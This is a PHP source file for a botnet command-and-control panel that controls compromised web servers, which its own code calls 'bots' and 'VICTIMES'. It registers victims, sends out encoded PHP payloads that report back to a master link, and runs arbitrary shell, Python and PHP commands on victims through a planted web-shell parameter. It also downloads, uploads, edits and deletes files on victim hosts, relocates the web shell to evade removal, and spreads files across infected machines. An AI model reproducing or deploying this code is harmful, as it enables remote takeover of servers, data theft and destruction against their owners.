<?php 
header('Access-Control-Allow-Origin: *');
error_reporting(0);
$_POST = @json_decode(@file_get_contents('php://input'), true);
include("db2.php");
include("commandeLib.php") ;
include("functions.php") ;


if(!file_exists("CACHEDBA.cfg")){
	echo "Can Not Load DBA Config ";
	die();
}
else{

	$cfg =  file_get_contents("CACHEDBA.cfg") ;
	$cfg = base64_decode(trim($cfg));
	$cfg = json_decode($cfg , true) ;
	if(!isset($cfg['HASHAES'] , $cfg['PUBLIC_KEY'] ,$cfg['HASHRSAPRIVATEKEY'])){
		echo "PRobleme in the cfg File ";
	}
	$pubkey = $cfg['PUBLIC_KEY'] ;
	//$privateKey
}

session_start();

if(isset($_SESSION["privateKey"])){
	$privateKey = $_SESSION["privateKey"] ;
}

if(isset($_GET['action'])){

	// @ THIS PART WILL GO TO STORE FUNCTIONS  ==> New Bots , Updates , .....
	$action = $_GET['action'];
	if($action==='DECLARE'){
		// @ CASE OF A NEW BOT
		$bot = array();
		$bot['link'] = $_POST['link'];
		$bot['path'] = $_POST['path'];
		$bot['domaine'] = $_POST['domaine'];
		$bot['cn'] = $_POST['cn'];
		$bot['php'] = $_POST['php'];
		$bot['socket'] = $_POST['socket'];
		$bot['os'] = $_POST['os'];
		$bot['php'] = $_POST['php'];
		$bot['kernel'] = $_POST['kernel'];
		$bot['cmd'] = $_POST['cmd'];
		$bot['python'] = $_POST['python'];
		$bot['ip'] = $_POST['ip'];
		$bot['key'] = $_POST['key'];
		$bot['idkey'] = $_POST['id'];

		
		$DBA = new DBA(NULL );
		$key = $DBA->load($_POST['id'], "" ,  'keys');


			
		if($key!=false){
			
			

			$b64_dec = base64_decode($bot['key']);
			$private_key = $key['private_key']; 
			openssl_private_decrypt($b64_dec, $decrypted, $private_key)."\n";
			//$bot['key'] =$bot['key'];
			
			
				
		}
			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$DBA->store($bot ,  'bots');
			$response =  array();
			$response['status'] =true ;
			echo json_encode($response);

		die();
	}
	else if($action==='signin'){
		if(isset($_GET['key'] , $_FILES['file'])){

			if(sha1($_GET['key']) === $cfg['HASHAES']  ){


					

				$file = file_get_contents( $_FILES['file']['tmp_name']);
				$RSAKeyCry = base64_decode(trim($file));

				$RSADecBase64 = decrypteObject($RSAKeyCry , $_GET['key'] ,  $cfg['HASHAES'] );
				$RSADec =  base64_decode(trim($RSADecBase64));


				if(sha1($RSADec) ===  $cfg['HASHRSAPRIVATEKEY']){

					session_start();
					$_SESSION["privateKey"] = $RSADec ;
					$privateKey = $RSADec ;
					$DBA = new DBA(NULL , TRUE ,  $pubkey );
					$VICTIMES = $DBA->loadAll( $privateKey , 'bots');
					printSucess($VICTIMES);
					die();
					

				}
				else{
					printError();
				}
				

			}
			else{
				printError();
			}
			
		}
		else{
			printError();
		}
		die();
	}
	else if($action==='CHECKNEW'){

		// Secure Key exchange  RSA -- > AES 


		$res=openssl_pkey_new();
		openssl_pkey_export($res, $privkey);
		$pubbkey=openssl_pkey_get_details($res);
		$pubbkey=$pubbkey["key"];

		

		$key = array();
		$key['public_key'] = $pubbkey;
		$key['private_key'] = $privkey;
		$DBA = new DBA(NULL );
		$id = $DBA->store($key , 'keys');
		$preparePhpCommandes = "";
		$preparePhpCommandes.= $functions['sendToMaster'];
		$preparePhpCommandes.= $functions['getOs'];
		$preparePhpCommandes.= $functions['execCmd'];
		$preparePhpCommandes.= $functions['fileCurl'];
		$preparePhpCommandes.= $functions['getCn'];
		$preparePhpCommandes.= $functions['getBotDetails'];
		$preparePhpCommandes.= $functions['checkPython'];
		$preparePhpCommandes.= $functions['randKey'];
		$preparePhpCommandes.= '$MASTERLINK = "'.getMasterLink().'" ;';
		$preparePhpCommandes.= '$ID = '.$id.';';
		$preparePhpCommandes.= '$pub_key = \''.$pubkey.'\';';
		$preparePhpCommandes.= '$keyAES = randKey();';
		$preparePhpCommandes.= 'openssl_public_encrypt($keyAES, $keyAESEncry, $pub_key);';
		$preparePhpCommandes.= '$data = getBotDetails() ;';
		$preparePhpCommandes.= '$data["action"]="DECLARE";';
		$preparePhpCommandes.= '$data["key"]= base64_encode($keyAESEncry);';
		$preparePhpCommandes.= '$data["key"]= $keyAES;';
		$preparePhpCommandes.= '$data["id"]= $ID;';
		$preparePhpCommandes.= 'echo  sendToMaster($data , $MASTERLINK);  ';
		$phpAsString = base64_encode($preparePhpCommandes);
		$response =  array();
		$response['status'] =true ;
		$response['order'] = $phpAsString;
		echo json_encode($response);
		die();
		
	}
	else if($action==='uploadTorDown'){

		if(isset($_FILES['file'])){
			
			$data = file_get_contents($_FILES['file']['tmp_name']);

			if(isset($_GET['key']) && strlen($_GET['key']) > 0){
				$key = md5($_GET['key']);
				$data = trim(decrypteObject($data , $key , $key ));
			}
			
			$data = json_decode( preg_replace('/[\x00-\x1F\x80-\xFF]/', '', $data), true );
			if(!isset($data['size'])){
				$message = "Invalid File / Key  ";
				printError($message);
				die();
			}
			if(count($data['nodes']) != $data['partNumber']  ){

				$message = "Error : Mismatch Nodes Numbers ";
				echo $message;
				printError($message);
				die();
			}
			
			$code = "";
			for ($i=0; $i < $data['partNumber']; $i++) { 

				$url = $data['nodes'][$i]['publicLink'];
				$url = str_replace(' ', '%20', $url);
				$smallPArt = @file_get_contents($url);

				if(!(md5($smallPArt) === $data['nodes'][$i]['md5'] )){

					$message = "Error : Hash Mismatch on Node ( $i )  : link ".$url;
					echo $message;
					die();
				}
				else{

					$code .= trim(decrypteObject($smallPArt, $data['nodes'][$i]['key'],$data['IV'])); 

				}

			}

			
			$code = base64_decode(trim($code));			
			$return = array();
			$return['name'] = $data['file_name'];
			$return['type'] = $data['type'];
			$return['code'] = $code;
			printSucess($return);
			
			die();
		}
		else {
			printError();
		}
	}
	else if($action==='torFile'){
		if(isset($_FILES['file'])){
			$buffer = 1000 ; 
			if(isset($_GET['buffer']) && is_numeric($_GET['buffer'])){
				$buffer = $_GET['buffer'] ; 
			}

			
			$data = base64_encode(file_get_contents($_FILES['file']['tmp_name']));
			$IV = randKey();
			$size = strlen($data);
			$fnumber = round($size/$buffer);
			$file = array();
			$file['file_name']= $_FILES['file']['name'];
			$file['hashMD5']= md5($data);
			$file['size'] = $size;
			$file['type'] = $_FILES['file']['type'];
			$file['IV'] = $IV;
			$file['buffer'] = $buffer;
			$file['partNumber'] =$fnumber;
			$file['nodes'] =array();

			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$bot = $DBA->loadAll( $privateKey ,  'bots');

			$N = count($bot);
			for ($i=0; $i < $fnumber ; $i++) { 
				$node = array();
				$node['key'] = randKey();

				$usedNode = $i%$N;
				$smallPart = substr($data , $buffer *$i , $buffer );
				$crPart = crypteObject($smallPart , $node['key']  , $file['IV']);
				
				$node['idpart'] = $i+1;
				
				$node['publicLink'] = tellBotToHost($bot[$usedNode] , $crPart); 
				$node['botID'] = $bot[$usedNode]['id'];
				$node['md5'] = md5($crPart);
				array_push($file['nodes'], $node);
			}

			$ret = json_encode($file);
			$res = array();
			$res['name'] =$file['file_name'].".key";
			if(isset($_GET['key']) && strlen($_GET['key']) > 0 ){
				$key = md5($_GET['key']);
				$res['data'] =  crypteObject($ret,$key   , $key);
			}else{
				$res['data'] = $ret ;

			}
			printSucess($res);
			die();

		}
		else {
			printError();
		}
	}
	else if($action==='uplodFile'){
		if(isset($_GET['id'] , $_GET['path'] , $_FILES['file'])){


			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$bot = $DBA->load($_GET['id']  , $privateKey, 'bots');
			$link = $bot['link'];

			$preparePhpCommandes  = "";
			$preparePhpCommandes .=  "@file_put_contents(\$_POST['path'], base64_decode(trim(\$_POST['file']))) ;";
			$post = array();
			$post['PHPCOMM'] = base64_encode($preparePhpCommandes);
			$post['file'] = base64_encode(file_get_contents($_FILES['file']['tmp_name']));
			$post['path'] = $_GET['path']."/".$_FILES['file']['name']; 
			$data =  trim(file_post_contents($bot , $post)) ;
			$data = json_decode($data , true);
			die();

		}
		else {
			printError();
		}
		
		
	}
	else if($action==='crFile'){
		$_FILES['file']['imgPath'] = $_GET['path'];
		echo json_encode($_FILES['file']);	
}
}
else if(isset($_POST['action'])){
	$action = $_POST['action'];
	if($action==='login'){
		if(isset($_POST['username'] , $_POST['password'])){
		if($_POST['username'] === $USERNAME && $_POST['password']===$PASSWORD ){
			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$VICTIMES = $DBA->loadAll( $privateKey , 'bots');
			printSucess($VICTIMES);
		}
	}
	else {
		printError();
	}

	}
	else if($action==='doCmd'){
	
		$DBA = new DBA(NULL , TRUE ,  $pubkey );
		$bot = $DBA->load($_POST['id'] , $privateKey , 'bots');
		$link = $bot['link'];
		$cmd = $_POST['cmd'];
		$cmd = includeCmd($cmd);
		$fullcode = "";
		$comm = 0 ;
		if(isset($cmd['cmds']) && strlen($cmd['cmds']) > 0 ){

			$cmds = $cmd['cmds'] ;
			$cmds = str_replace("'", "\'", $cmds);
			$comm = 1;
			$fullcode .=  $functions['execCmd'];
			$fullcode .= "echo '</br><span style=\" color : green ;  \">## =========== START SHELL =========== ##</span></br>';";
			$fullcode .= "\$cmdcode =  '".$cmds." ;' ;";
			$fullcode .= "echo execCmd(\$cmdcode);";
			$fullcode .= "echo '<span style=\" color : green ; \">## =========== END SHELL =========== ##</span></br>';";


		}
		if(isset($cmd['python']) && strlen($cmd['python']) > 0){
			$code = $cmd['python'] ;
			$code = str_replace("'", "\'", $code);
			if($comm ==0 ){
				$fullcode .=  $functions['execCmd'];
			}
			
			$fullcode .=  $functions['execPython'];
			$fullcode .= "echo '</br><span style=\" color : green ;  \">## =========== START PYTHON =========== ##</span></br>';";
			$fullcode .=  "\$pythoncode = '".$code."';";
			$fullcode .= "echo execPython(\$pythoncode);";
			$fullcode .= "echo '<span style=\" color : green ; \">## =========== END PYTHON =========== ##</span></br>';";

		}
		
		$cmd = 	$cmd['code'];
		if(strlen($cmd['code']) > 0){
			$fullcode .= "echo '</br><span style=\" color : green ;  \">## =========== START PHP =========== ##</span></br>';";
			$fullcode .= includeFunction($cmd);
			$fullcode .= "echo '</br><span style=\" color : green ;  \">## =========== END PHP =========== ##</span>';";
		}
		
		$post = array();
		$post['PHPCOMM'] = base64_encode($fullcode);
		$result= trim(file_post_contents($bot , $post)) ;
		$response['status'] =true ;
		$response['data'] = $result;
		echo json_encode($response);

		
		
	}
	else if($action==='deleteBot'){

		if(isset($_POST['id'])){

			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$bot = $DBA->delete($_POST['id'] , 'bots');
			if($bot == true)printSucess();
			else{
				printError();
				die();
			}


		}
		else{
			printError();
		}

	}
	else if($action==='editFile'){
		if(isset($_POST['id'] , $_POST['path'] , $_POST['contenu'])){
		
			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$bot = $DBA->load($_POST['id']  , $privateKey , 'bots');
			$link = $bot['link'];
			$preparePhpCommandes = "";
			$preparePhpCommandes.=  $functions['editFile'];
			$_POST['contenu'] = str_replace("'", "\'", $_POST['contenu']);
			$preparePhpCommandes.= "echo json_encode(editFile('".$_POST['path']."' , '".$_POST['contenu']."'))";
			$post = array();
			$post['PHPCOMM'] = base64_encode($preparePhpCommandes);
			$data =  trim(file_post_contents($bot , $post)) ;
			$data = json_decode($data , true);
			if($data!=true){
				printError();
			}
			else {
				printSucess();
			}
			die();

		}
		else {
			printError();
		}
	}
	
	else if($action==='download'){
		if(isset($_POST['id'] , $_POST['path'])){
			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$bot = $DBA->load($_POST['id']  , $privateKey, 'bots');
			$link = $bot['link'];
			$preparePhpCommandes = "";
			$preparePhpCommandes .= "\$data = array();";
			$preparePhpCommandes .= "\$data['code'] = base64_encode(file_get_contents('".$_POST['path']."'));";
			$preparePhpCommandes .= "\$data['type'] = mime_content_type('".$_POST['path']."');";
			$preparePhpCommandes .= "\$data['status'] = true;";
			$preparePhpCommandes .= " echo json_encode(\$data)";
			$post = array();
			$post['PHPCOMM'] = base64_encode($preparePhpCommandes);
			$data =  trim(file_post_contents($bot , $post)) ;
			$data = json_decode($data ,true);
			$data['code'] = base64_decode(trim($data['code']));

			echo json_encode($data);
			die();

		}
		else{
			printError();
		}
	}	
	else if($action==='unzip'){
		if(isset($_POST['id'] , $_POST['name'] , $_POST['path'])){

			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$bot = $DBA->load($_POST['id'] , $privateKey , 'bots');
			$link = $bot['link'];
			$preparePhpCommandes = "";
			$preparePhpCommandes.= $functions['unzipFile'];
			$preparePhpCommandes.='echo json_encode(unzipFile("'.$_POST['path'].'", "'.$_POST['name'].'"));';
			$post = array();
			$post['PHPCOMM'] = base64_encode($preparePhpCommandes);
			$data =  trim(file_post_contents($bot , $post)) ;
			$data = json_decode($data , true) ;
			printSucess($data);
			die();


		}
		else {
			printError();
		}
	}
	else if($action==='zip'){
		if(isset($_POST['id'] , $_POST['name'] , $_POST['path'])){

			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$bot = $DBA->load($_POST['id']  , $privateKey , 'bots');
			$link = $bot['link'];
			$preparePhpCommandes = "";
			$preparePhpCommandes.= $functions['zipFile'];
			$preparePhpCommandes.='echo json_encode(zipFile("'.$_POST['path'].'", "IRC-Bot-master2"));';
			$post = array();
			$post['PHPCOMM'] = base64_encode($preparePhpCommandes);
			$data =  trim(file_post_contents($bot , $post)) ;
			$data = json_decode($data , true) ;
			printSucess($_POST['path']);
			die();


		}
		else {
			printError();
		}
	}
	else if($action==='mkdir'){
		if(isset($_POST['id'] , $_POST['name'] , $_POST['path'])){
			
			$response = array();
			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$bot = $DBA->load($_POST['id']  , $privateKey, 'bots');
			$link = $bot['link'];
			$path = $_POST['path']."/".$_POST['name'];
			$preparePhpCommandes = "";
			$preparePhpCommandes.= $functions['makeDir'];
			$preparePhpCommandes.="echo json_encode(makeDir('".$path."'));";
			$post = array();
			$post['PHPCOMM'] = base64_encode($preparePhpCommandes);
			$data =  trim(file_post_contents($bot , $post)) ;
			$data = json_decode($data , true) ;
			if($data==true){

				$response['status'] =true;
				echo json_encode($response);
				die();
			}
			else {
				$response['status'] =false ;
				$response['error'] = 'Directory already exict or access denied';
				echo json_encode($response);
				die();

			}
		}
		else {
			printError();
		}

	}
	else if($action==='refreshBots'){

			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$VICTIMES = $DBA->loadAll( $privateKey , 'bots');
			printSucess($VICTIMES);
			die();

	}
	else if($action==='changeBotlink'){
		if(isset($_POST['id'])){

			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$bot = $DBA->load($_POST['id'] , $privateKey , 'bots');
			$link = $bot['link'];
			$path = $bot['path'];
			$preparePhpCommandes = "";
			$preparePhpCommandes.= $functions['change'];
			$preparePhpCommandes.= $functions['randName'];
			$preparePhpCommandes.= "change('$path') ;";
			$post = array();
			$post['PHPCOMM'] = base64_encode($preparePhpCommandes);
			$data =  trim(file_post_contents($bot , $post)) ;
			$newlink = json_decode($data ,true) ;
			$ph = "echo 'PXCDEEF'";
			$post = array();
			$post['PHPCOMM'] = base64_encode($ph);
			$oldlink = $bot['link'];
			$bot['link'] =  $newlink['link'] ;
			$df =  trim(file_post_contents($bot , $post)) ;
			if(preg_match("/PXCDEEF/", $df)){
				$tmp = $bot['path'] ;
				$bot['link'] = $newlink['link'];
				$bot['path'] = $newlink['path'];
				$DBA->update($_POST['id'] , $bot , 'bots');
				$phpcode = '@unlink("'.$tmp.'") ; ';
				$post = array();
				$post['PHPCOMM'] = base64_encode($phpcode);
				trim(file_post_contents($newlink['link'] , $post)) ;
				printSucess($df);


			}
			else{
				$bot['link'] =  $oldlink ;
				$phpcode = 'echo "'.$newlink['path'].'"  ;';
				$post = array();
				$post['PHPCOMM'] = base64_encode($phpcode);
				$df =  trim(file_post_contents($bot , $post)) ;
				printError();
			}

			die();
			

		}
		else{
			printError();
		}
			
	}
	else if($action==='deleteFile'){
		if(isset($_POST['id'] , $_POST['path'] , $_POST['type'])){

			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$bot = $DBA->load($_POST['id']  , $privateKey , 'bots');

			$link = $bot['link'];
			if($_POST['type'] == 1){
				$preparePhpCommandes .= "";
				$preparePhpCommandes.= $functions['delTree'];
				$preparePhpCommandes .=  "delTree('".$_POST['path']."');";

			}
			else {
				$preparePhpCommandes = "@unlink('".$_POST['path']."') ; ";
			}
			$post = array();
			$post['PHPCOMM'] = base64_encode($preparePhpCommandes);
			file_post_contents($bot , $post) ;
		}

	}
	else if($action==='mkFile'){
		if(isset($_POST['id'] , $_POST['name'] , $_POST['path'])){
			
			$path = $_POST['path']."/".$_POST['name'];

			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$bot = $DBA->load($_POST['id'] , $privateKey , 'bots');
			$link = $bot['link'];
			$preparePhpCommandes = "";
			$preparePhpCommandes.= $functions['mkFile'];
			$preparePhpCommandes.="echo json_encode(mkFile('".$path."'));";
			$post = array();
			$post['PHPCOMM'] = base64_encode($preparePhpCommandes);
			$data =  trim(file_post_contents($bot , $post)) ;
			$data = json_decode($data , true) ;
			if($data==true){

				$response['status'] =true;
				echo json_encode($response);
				die();
			}
			else {
				$response['status'] =false ;
				$response['error'] = 'Access denied';
				echo json_encode($response);
				die();

			}






		}
		else {
			printError();
		}

	}
	else if($action==='getFiles'){
		if(isset($_POST['id'])){

			$DBA = new DBA(NULL , TRUE ,  $pubkey );
			$bot = $DBA->load($_POST['id'] , $privateKey , 'bots');

			$link = $bot['link'];

			$preparePhpCommandes= "";
			if(isset($_POST['path'])){
				$preparePhpCommandes= "";
				if(isset($_POST['type']) &&  $_POST['type']==0){
					
					$preparePhpCommandes.=  $functions['fileContent'];
					$preparePhpCommandes.= "echo json_encode(fileContent('".$_POST['path']."')); ";
					$post = array();
					$post['PHPCOMM'] = base64_encode($preparePhpCommandes);
					$data =  trim(file_post_contents($bot , $post)) ;
					$data = json_decode($data , true) ;
					if($data['status']==true){
						$imgs = array("png", "gif", "jpg");
						$ext =  pathinfo($_POST['path'], PATHINFO_EXTENSION);
						if(in_array($ext, $imgs)){

							$data['data'] = $data['data'];
							$data['img'] = true;
							echo json_encode($data);
							die();


						}
						else {
							$data['data'] = base64_decode($data['data'] );
							echo json_encode($data);
							die();	
						}

						

					}
					else {
						$response['status'] =false ;
						$response['error'] = $data['error'];
						echo json_encode($response);
						die();
					}
					die();
				}
				else {
					$preparePhpCommandes.=  $functions['getPathFiles'];
					$preparePhpCommandes.= "echo json_encode(getPathFiles('".$_POST['path']."')) ; ";
				}
				
			}
			else {
				$preparePhpCommandes.=  $functions['getPathFiles'];
				$preparePhpCommandes.= "echo json_encode(getPathFiles());";
			}
			
			$post = array();
			$post['PHPCOMM'] = base64_encode($preparePhpCommandes);
			$result= trim(file_post_contents($bot , $post)) ;
			$result= json_decode($result , true);
			printSucess($result);
			die();


		}
	}

}

?>